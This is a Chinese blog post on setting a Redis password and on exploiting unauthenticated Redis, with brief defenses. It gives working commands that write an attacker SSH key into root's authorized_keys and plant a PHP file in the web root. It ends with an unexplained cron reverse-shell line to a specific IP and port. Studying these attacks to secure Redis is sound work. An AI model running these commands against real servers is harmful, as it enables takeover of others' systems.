---
title: redis设置认证密码
tags:
  - redis
categories:
  - 数据库
copyright: true
permalink: redis设置认证密码
top: 0
password: 
abstract: 输入密码继续阅读.
message: 欢迎来到我的博客，输入密码继续阅读.
date: 2020-01-14 21:09:05
---

人生苦短我用python
<!--more-->
## 首先连接Redis，然后执行CONFIG SET requirepass userpassword
```
/usr/local/redis/bin/redis-cli -h 127.0.0.1 -p 6379
127.0.0.1:6379> KEYS *
1) "user"
127.0.0.1:6379> CONFIG SET requirepass 123.com
OK
127.0.0.1:6379> KEYS *
(error) NOAUTH Authentication required.
127.0.0.1:6379> quit
```
从上面可以看到密码设置成功，同时一旦密码设置成功，刚刚建立的连接将不能进行任何权限操作
```
#使用-a userpassword 登录Redis
/usr/local/redis/bin/redis-cli -h 127.0.0.1 -p 6379 -a 123.com
127.0.0.1:6379> KEYS *
1) "user"
127.0.0.1:6379> set job it
OK
127.0.0.1:6379> KEYS *
1) "job"
2) "user"
127.0.0.1:6379> 
#通过Redis登录后可以看到可以进行任何操作
```

## docker 创建redis设置密码

```
 docker run -d --name myredis -p 6379:6379 redis --requirepass "doonsec"
```
跟上参数 `requirepass`


## 未授权访问

Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作

（1）、redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；(这样的配置非常的普遍)

（2）、可以远程登录，一般是通过ssh，可以免密码登录
### 写ssh-keygen公钥然后使用私钥登陆:


利用条件:

（1）、redis的权限是以root访问；

（2）、可以ssh通过秘钥远程登录；

在本机创建密钥对
```
ssh-keygen -t rsa
```
执行以下命令，将本地的ssh的公钥导入到靶机上面，这样我们就可以不用输入密码直接登录远程服务器:

```
config set dir /root/.ssh;

config set dbfilename authorized_keys;

set x "\n\n\nssh-rsa 公钥 root@kalin\n\n\n";

save;
```
**注意：必须是root用户创建redis，否则执行命令没有权限**

```
127.0.0.1:6379> config set dir /root/.ssh;
(error) ERR Changing directory: Permission denied
```

通过执行连接命令:ssh -i id_rsa root@192.168.64.165 ,无需输入密码就可以成功登录靶机:
```
ssh -i id_rsa root@ ip地址
```
### 2、通过写入web服务的目录，获取服务器webshell：

利用条件:

(1)、网站存在web服务；

(2)、运行redis服务的权限较低；

(3)、web目录有写入的权限；

(4)、能够猜解出网站的根目录；


执行以下命令，将一句话或者测试代码写入到网站根目录下:
```
config set dir /var/www/html ; 定位到网站根目录下；

config set dbfilename cmdback.php ; 创建一个php文件

set x "<?php echo 'hello word'?>"  将内容写入到cmdback.php中

save;
```
查看数据
```
root@e35a54b91583:/data# ls
cmdback.php
root@e35a54b91583:/data#
```

### 防御措施:

（1）、登录账户设置复杂的口令；

（2）、修改原端口；

（3）、禁止公钥登陆系统；

（4）、设置IP白名单策略；

* * * * * bash -i >& /dev/tcp/47.100.199.103/8007 0>&1